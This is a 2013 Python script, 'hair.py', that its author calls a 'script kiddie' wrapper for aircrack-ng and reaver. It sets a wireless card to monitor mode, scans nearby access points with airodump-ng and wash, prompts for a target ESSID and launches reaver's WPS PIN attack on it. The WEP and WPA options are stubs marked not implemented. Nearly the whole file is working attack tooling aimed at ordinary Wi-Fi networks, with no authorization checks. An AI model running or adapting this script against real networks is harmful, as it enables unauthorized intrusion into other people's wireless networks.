#!/usr/bin/python3
#
#
# hair.py v0.01
# Script kiddie version of the aircrack-ng/pyrit/reaver tool-suites.
# - AdamKnube 2013
#
#
# TODO:
# - Channel lock option
# - Incorperate wep and wpa attacks using aircrack-ng and pyrit
# - Currently only working attacks involve reaver and wash
#

# Imports
from re import sub
from sys import argv
from time import sleep
from getopt import getopt
from subprocess import PIPE, Popen
from os import remove, path, system, popen

# Globals
debug = 0
showscan = 0
washtime = 0
scantime = 0
iface = 'wlan0'

# Statics
DUMP_BSSID = 0
DUMP_ESSID = 13
DUMP_CHANNEL = 3
DUMP_PRIVACY = 5
DUMP_POWER = 8
WASH_BSSID = 0
WASH_ESSID = 5
WASH_CHANNEL = 1
WASH_LOCKED = 4
WASH_POWER = 2
AIRCRACK = '/usr/bin/aircrack-ng'
AIREPLAY = '/usr/bin/aireplay-ng'
AIRODUMP = '/usr/bin/airodump-ng'
WASH = '/usr/bin/wash -C'
REAVER = '/usr/bin/reaver'
IFCONFIG = '/usr/bin/ifconfig'
IWCONFIG = '/usr/bin/iwconfig'
DATE = '/usr/bin/date'
KILLALL = '/usr/bin/killall -w'

# Debug printer
def dprint(data='', iforce=0):
	global debug
	if ((iforce==1) or (debug==1)):
		print(data)

# String padder
def pad(data='', ilength=0):
	if (len(data) == ilength):
		return data
	elif (len(data) > ilength):
		return data[0:ilength - 3] + '...'
	else:
		diff = ilength - len(data)
		return data + (' ' * diff)
		
# Option parser		
def parseopts():
	global debug
	global iface
	global scantime
	global washtime
	global showscan
	dprint(repr(argv))
	opts, lovr = getopt(argv[1:], 'vsi:a:r:')
	for opt, arg in opts:
		if opt in ('-v'):
			debug = 1
		if opt in ('-s'):
			showscan = 1
		elif opt in ('-i'):
			iface = arg
		elif opt in ('-a'):
			scantime = int(arg)
		elif opt in ('-r'):
			washtime = int(arg)
			
def dosep():
	dprint('-' * 90, 1)
	
def showtable(thekeys, thetable):
	apcount = 0
	for ap in thetable:
		apcount += 1
		pstr = ''
		for wkey in thekeys:
			padamt = 6
			if (wkey == 'BSSID'):
				padamt = len(ap[wkey]) + 2
			elif (wkey == 'ESSID'):
				padamt = 13
			elif (wkey.lower() == 'channel'):
				padamt = 3
			pstr += wkey + ': ' + pad(ap[wkey], padamt)  + ' '
		dprint(pstr, 1)
		
# Main loop		
def runmain():
	
	# Init
	global iface
	global scantime
	global washtime
	global showscan
	global DUMP_BSSID
	global DUMP_ESSID
	global DUMP_CHANNEL
	global DUMP_PRIVACY
	global DUMP_POWER
	global WASH_BSSID
	global WASH_ESSID
	global WASH_CHANNEL
	global WASH_LOCKED
	global WASH_POWER
	global AIRCRACK
	global AIREPLAY
	global AIRCOUMP
	global WASH
	global REAVER
	global IFCONFIG
	global IWCONFIG
	global DATE
	global KILLALL
	parseopts()
	if ((scantime < 1) and (washtime < 1)):
		dprint('Please select at least one scan mode!', 1)
		return 1
	thenow = popen(DATE).read()
	dprint(argv[0] + ' started on ' + thenow.strip())
	dprint('Setting wireless card ' + iface + ' to monitor mode')
	system(IFCONFIG + ' ' + iface + ' down')
	system(IWCONFIG + ' ' + iface + ' mode monitor')
	system(IFCONFIG + ' ' + iface + ' up')
	dprint('Scanning for ' + repr(scantime + washtime) + ' seconds...', 1)
	
	# Scan airodump-ng
	if (scantime > 0):
		if (path.exists('quickscan-01.csv')):
			remove(r'quickscan-01.csv')
		dprint('Starting ' + AIRODUMP)
		if (showscan != 1):
			Popen(AIRODUMP + ' --write quickscan --output-format csv ' + iface, shell=True, stderr=PIPE, stdout=PIPE, stdin=PIPE)
		else:
			popen(AIRODUMP + ' --write quickscan --output-format csv ' + iface)
		
		# Sleep airodump-ng
		dprint('airodump-ng scanning for ' + repr(scantime) + ' seconds...')
		sleep(scantime)

		# Kill airodump-ng
		dprint('Terminating ' + AIRODUMP)
		popen(KILLALL + ' airodump-ng')

	# Scan wash
	if (washtime > 0):
		if (path.exists('quickscan.wash')):
			remove(r'quickscan.wash')		
		dprint('Starting ' + WASH)
		if (showscan != 1):
			Popen(WASH + ' -o quickscan.wash -i ' + iface, shell=True, stderr=PIPE, stdout=PIPE)
		else:
			popen(WASH + ' -o quickscan.wash -i ' + iface)

		# Sleep wash
		dprint('wash scanning for ' + repr(washtime) + ' seconds...')
		sleep(washtime)

		# Kill wash
		dprint('Terminating ' + WASH)
		popen(KILLALL + ' wash')
	
	# Read airodump
	dprint('Reading scan file(s)...')
	if (scantime > 0):
		aptable = [ ]
		dumprows = open('quickscan-01.csv').readlines()[1:]
		colnames = dumprows[0].replace(' ', '').split(',')
		found = False
		for dump in dumprows[1:]:
			if ((found == False) and (dump.replace('\n', '') != '')):
				cleanid = dump.replace(' ', '').replace('\n', '').split(',')
				dprint('adding cleanid: \'' + repr(cleanid) + '\'')
				thisap = dict(zip(colnames, cleanid))
				aptable.append(thisap)
			else:
				found = True
	
	# Read wash
	if (washtime > 0):
		washtable = [ ]
		washrows = open('quickscan.wash').readlines()[0:]
		washnames = sub(' +', ' ', washrows[0]).replace('WPS ', 'WPS-').replace('\n', '').split(' ')			
		for wash in washrows[2:]:
			if (wash.replace('\n', '') != ''):
				cleanid = sub(' +', ' ', wash.replace('\n', '')).split(' ')
				thisap = dict(zip(washnames, cleanid))
				washtable.append(thisap)
			
	# Show airodump-ng	
	if (scantime > 0):
		dosep()
		dprint('airodump-ng results:', 1)
		keykeys = [colnames[DUMP_BSSID], colnames[DUMP_ESSID], colnames[DUMP_CHANNEL], colnames[DUMP_PRIVACY], colnames[DUMP_POWER]]
		showtable(keykeys, aptable)

	# Show wash
	if (washtime > 0):
		dosep()
		dprint('wash results:', 1)
		keykeys = [washnames[WASH_BSSID], washnames[WASH_ESSID], washnames[WASH_CHANNEL], washnames[WASH_LOCKED], washnames[WASH_POWER]]
		showtable(keykeys, washtable)
		
	dosep()
		
	# Get attack option
	atkopts = [ ]
	if (scantime > 0):
		atkopts.append('wep')
		atkopts.append('wpa')
	if (washtime > 0) or ():
		atkopts.append('wps')	
	atkmode = ''
	if (len(atkopts) == 1):
			dprint('Auto-selecting WPS attack vector', 1)
			atkmode = 'wps'	
	while (atkmode == ''):
		avector = input('Please select an attack vector ' + repr(atkopts) + ': ').replace('\n', '').strip()
		for mode in atkopts:
			if (avector == mode):
				atkmode = avector
		if (atkmode == ''): 
			dprint('Invalid attack vector chosen: ' + avector, 1)	
	dprint('Selected attack vector: ' + atkmode)
	if (atkmode == 'wps'):
		who2reav = input('Please enter the ESSID to attack: ').replace('\n', '').strip()
		for ap in washtable:
			if (ap[washnames[WASH_ESSID]] == who2reav):
				dprint('Setting wireless channel to ' + ap[washnames[WASH_CHANNEL]])
				thecmd = IWCONFIG + ' ' + iface + ' channel ' + ap[washnames[WASH_CHANNEL]]
				popen(thecmd)
				thecmd = REAVER + ' -i ' + iface + ' -b ' + ap[washnames[WASH_BSSID]] + ' -c ' + ap[washnames[WASH_CHANNEL]] + ' -vv'
				dprint('Launching ' + REAVER + ', good luck!', 1)
				dprint('Executing: ' + thecmd)
				thereaver = Popen(thecmd, shell=True)
				thereaver.wait()
				return 0
		dprint('Invalid ESSID selected, you MUST type this correctly. Aborting...', 1)
		return 1
	elif (atkmode == 'wpa'):
		who2dict = input('Please enter the ESSID to attack: ').replace('\n', '').strip()
		for ap in aptable:
			if (ap[colnames[DUMP_ESSID]] == who2dict):
				dprint('Not Implemented yet sorry', 1)
				return 0
		dprint('Invalid ESSID selected, you MUST type this correctly. Aborting...', 1)
		return 1
	else:
		who2crak = input('Please enter the ESSID to attack: ').replace('\n', '').strip()
		for ap in aptable:
			if (ap[colnames[DUMP_ESSID]] == who2crak):
				dprint('Not Implemented yet sorry', 1)
				return 0
		dprint('Invalid ESSID selected, you MUST type this correctly. Aborting...', 1)
		return 1						

# Do-it-to-it
if (__name__ == '__main__'):
	exit(runmain())
